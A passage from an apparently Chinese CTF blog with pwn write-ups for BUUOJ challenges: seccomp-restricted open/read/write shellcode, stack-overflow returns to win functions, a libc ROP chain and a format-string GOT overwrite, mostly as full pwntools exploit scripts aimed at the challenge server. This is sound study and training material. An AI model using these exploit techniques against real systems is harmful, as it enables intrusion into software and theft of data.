    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29550</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>] <span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
rce18 = []
realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()
win_function1 = <span class="hljs-number">0x080485CB</span>
win_function2 = <span class="hljs-number">0x80485D8</span>
flag = <span class="hljs-number">0x0804862B</span>
offset = <span class="hljs-number">0x18</span> + <span class="hljs-number">4</span>
ru(<span class="hljs-string">'Enter your input&gt;'</span>)
payload = <span class="hljs-string">'a'</span> * offset + flat([win_function1,win_function2,flag,<span class="hljs-number">0xBAAAAAAD</span>,<span class="hljs-number">0xDEADBAAD</span>])
<span class="hljs-comment"># debug()</span>
s(payload + <span class="hljs-string">'\n'</span>)
itr()</code></pre></div>

<h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a><code>pwnable_orw</code></h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>考点 ：</p>
<ul>
<li>简单shellcode 的编写</li>
<li>seccomp（挖坑）</li>
</ul>
<p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
<p><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a></p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/P0Ku7D.png" srcset="/img/loading.gif" alt></p>
<p>先用<code>seccomp-tools</code>看下禁用了什么函数：</p>
<div class="hljs"><pre><code class="hljs undefined">➜  pwnable_orw seccomp-tools dump ./orw
 line  CODE  JT   JF      K
=================================
 <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch
 <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) goto <span class="hljs-number">0011</span>
 <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number
 <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000ad</span>  <span class="hljs-keyword">if</span> (A == rt_sigreturn) goto <span class="hljs-number">0011</span>
 <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000077</span>  <span class="hljs-keyword">if</span> (A == sigreturn) goto <span class="hljs-number">0011</span>
 <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A == exit_group) goto <span class="hljs-number">0011</span>
 <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == exit) goto <span class="hljs-number">0011</span>
 <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A == open) goto <span class="hljs-number">0011</span>
 <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) goto <span class="hljs-number">0011</span>
 <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) goto <span class="hljs-number">0011</span>
 <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)
 <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW</code></pre></div>

<p>明显只能执行 open read wirte 函数。</p>
<div class="hljs"><pre><code class="hljs undefined">#这里可以用pwntools库的一个函数代替,shellcraft
c语言:<span class="hljs-built_in">open</span>(<span class="hljs-string">"/home/orw/flag"</span>) &lt;==&gt; 汇编:<span class="hljs-keyword">asm</span>(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">"/home/orw/flag"</span>))
c语言:<span class="hljs-built_in">read</span>(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x20</span>)&lt;==&gt; 汇编:<span class="hljs-keyword">asm</span>(shellcraft.<span class="hljs-built_in">read</span>(<span class="hljs-number">3</span>,<span class="hljs-string">"esp"</span>,<span class="hljs-number">0x20</span>)
c语言:<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x20</span>)&lt;==&gt;汇编:<span class="hljs-keyword">asm</span>(shellcraft.<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,<span class="hljs-string">"esp"</span>,<span class="hljs-number">0x20</span>))</code></pre></div>

<p>其中 就是以esp当做临时变量 buf的地址，其可以自定义。</p>
<p>其中open函数执行后，由于是打开了一个新的文件，其返回的fd就是3，所以后面跟着的read的文件描述符也为3。</p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./orw'</span>
local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26224</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
rce18 = []
realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

bss = <span class="hljs-number">0x804A128</span> - <span class="hljs-number">0x30</span>
payload= asm(shellcraft.open(<span class="hljs-string">"./flag"</span>))
payload += asm(shellcraft.read(<span class="hljs-number">3</span>,bss,<span class="hljs-number">0x30</span>))
payload += asm(shellcraft.write(<span class="hljs-number">1</span>,bss,<span class="hljs-number">0x30</span>))

sl(payload)

itr()</code></pre></div>

<h2 id="V-amp-N2020-公开赛warmup"><a href="#V-amp-N2020-公开赛warmup" class="headerlink" title="V&amp;N2020 公开赛warmup"></a>V&amp;N2020 公开赛warmup</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>开启了沙盒，使用orw获取flag即可。</p>
<div class="hljs"><pre><code class="hljs undefined">
Here <span class="hljs-keyword">is</span> my gift: <span class="hljs-number">0x7f411f85c9c0</span>
 line  CODE  JT   JF      K
=================================
 <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch
 <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) goto <span class="hljs-number">0011</span>
 <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number
 <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &gt;= <span class="hljs-number">0x40000000</span>) goto <span class="hljs-number">0011</span>
 <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A == execve) goto <span class="hljs-number">0011</span>
 <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A != write) goto <span class="hljs-number">0010</span>
 <span class="hljs-number">0006</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000024</span>  A = count &gt;&gt; <span class="hljs-number">32</span> # write(fd, buf, count)
 <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) goto <span class="hljs-number">0010</span>
 <span class="hljs-number">0008</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000020</span>  A = count # write(fd, buf, count)
 <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x10</span>) goto <span class="hljs-number">0011</span>
 <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW
 <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL</code></pre></div>

<p>其中，这题因为只有<code>0x10</code>的溢出空间，猛的一看需要栈迁移，但是会发现不知道往哪里迁移。看了师傅们的博客才知道，由于第一个栈空间较大，且与第二个可以溢出的栈是<strong>紧邻</strong>的。然后，就可以在溢出时覆盖一下返回地址，覆盖为ret，这样就可以多一个ret，从而<strong>接着执行</strong>上一个栈帧buf里面构造的rop链。</p>
<p>并且在orw中，open函数的第一个参数时一个指针地址(<code>*filename</code>)，所以需要先read一下flag的文件名到一个buf当中，然后再进行orw。</p>
<p>Buf的寻找：<br>在libc中找一个没有用到的地址段即可。比如<code>__free_hook</code></p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/B3tfJG.png" srcset="/img/loading.gif" alt></p>
<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./vn_pwn_warmup'</span>
local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27585</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

ru(<span class="hljs-string">'0x'</span>)
libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">'puts'</span>]
info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)
pop_rdi = <span class="hljs-number">0x0000000000021102</span> + libc_base
pop_rsi = <span class="hljs-number">0x00000000000202e8</span> + libc_base
pop_rdx = <span class="hljs-number">0x0000000000001b92</span> + libc_base
open = libc_base+libc.sym[<span class="hljs-string">'open'</span>]
read = libc_base+libc.sym[<span class="hljs-string">'read'</span>]
puts = libc_base+libc.sym[<span class="hljs-string">'puts'</span>]
buf = libc_base+libc.sym[<span class="hljs-string">'__free_hook'</span>]

payload = flat([
    pop_rdi,<span class="hljs-number">0</span>,pop_rsi,buf,pop_rdx,<span class="hljs-number">8</span>,read,
    pop_rdi,buf,pop_rsi,<span class="hljs-number">0</span>,pop_rdx,<span class="hljs-number">0</span>,open,
    pop_rdi,<span class="hljs-number">3</span>,pop_rsi,buf,pop_rdx,<span class="hljs-number">0x30</span>,read,
    pop_rdi,buf,puts
])
sa(<span class="hljs-string">':'</span>,payload)
<span class="hljs-comment"># debug()</span>
ret = libc_base + <span class="hljs-number">0x0000000000000937</span>
payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x78</span> + p64(ret)
sa(<span class="hljs-string">'?'</span>,payload)
sleep(<span class="hljs-number">1</span>)
<span class="hljs-comment"># debug()</span>
s(<span class="hljs-string">'./flag\x00\x00'</span>)
itr()</code></pre></div>

<h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow 1"></a><code>picoctf_2018_buffer overflow 1</code></h2><p>简单的栈溢出，且存在后门。</p>
<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./PicoCTF_2018_buffer_overflow_1'</span>
local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29988</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

win = <span class="hljs-number">0x080485CB</span>
offset = <span class="hljs-number">0x28</span> + <span class="hljs-number">0x4</span>
payload = <span class="hljs-string">'a'</span>*offset + p32(win)
sa(<span class="hljs-string">':'</span>,payload)
itr()</code></pre></div>

<h2 id="picoctf-2018-buffer-overflow-2"><a href="#picoctf-2018-buffer-overflow-2" class="headerlink" title="picoctf_2018_buffer overflow 2"></a><code>picoctf_2018_buffer overflow 2</code></h2><p>类似上题，考个控制传参。</p>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./PicoCTF_2018_buffer_overflow_2'</span>
local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29988</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()
win = <span class="hljs-number">0x80485CB</span>
offset = <span class="hljs-number">0x6c</span> + <span class="hljs-number">0x4</span>
payload = <span class="hljs-string">'a'</span>*offset + p32(win) + p32(<span class="hljs-number">0xDEADBEEF</span>) + p32(<span class="hljs-number">0xDEADBEEF</span>) + p32(<span class="hljs-number">0xDEADC0DE</span>)
s(payload)</code></pre></div>

<h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><code>axb_2019_fmt32</code></h2><p>32位的格式化字符串，考的是单次printf多次写入，因为是32位pwntools的<code>fmtstr_payload</code>是十分好用的。</p>
<h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./axb_2019_fmt32'</span>
local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29147</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()
printf_got = <span class="hljs-number">0x804A014</span>
payload = <span class="hljs-string">"%9$sA"</span> + p32(<span class="hljs-number">0x804A014</span>)
sla(<span class="hljs-string">'me:'</span>,payload)
ru(<span class="hljs-string">'Repeater:'</span>)
printf_got = uu32(r(<span class="hljs-number">4</span>))
libc_base = printf_got - <span class="hljs-number">0x049020</span>
info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)
offset = <span class="hljs-number">8</span>
rce = libc_base + <span class="hljs-number">0x3a80c</span>
info_addr(<span class="hljs-string">'rec'</span>,rce)
payload = <span class="hljs-string">'a'</span> + fmtstr_payload(offset,&#123;<span class="hljs-number">0x804A014</span>:rce&#125;,write_size = <span class="hljs-string">"byte"</span>,numbwritten = <span class="hljs-number">10</span>)
sla(<span class="hljs-string">'me:'</span>,payload)
itr()</code></pre></div>

<h2 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a><code>pwnable_start</code></h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>32位，无任何保护，作者自己汇编写的程序。<br>分析汇编以后可以认为就是：</p>
<div class="hljs"><pre><code class="hljs c">write(<span class="hljs-number">1</span>,esp,<span class="hljs-number">20</span>)
read(<span class="hljs-number">0</span>,esp,<span class="hljs-number">60</span>)</code></pre></div>

<p>十分明显的栈溢出，但是难点在shellcode摆上栈以后，如何跳转过去执行。</p>
<p>利用思路：</p>
<ul>
<li>利用控制eip，返回wirte处，泄漏一下栈地址，然后根据偏移算出esp的地址</li>
<li>摆shellcode上栈，控制好eip</li>
</ul>
<h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./start'</span>
local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27834</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
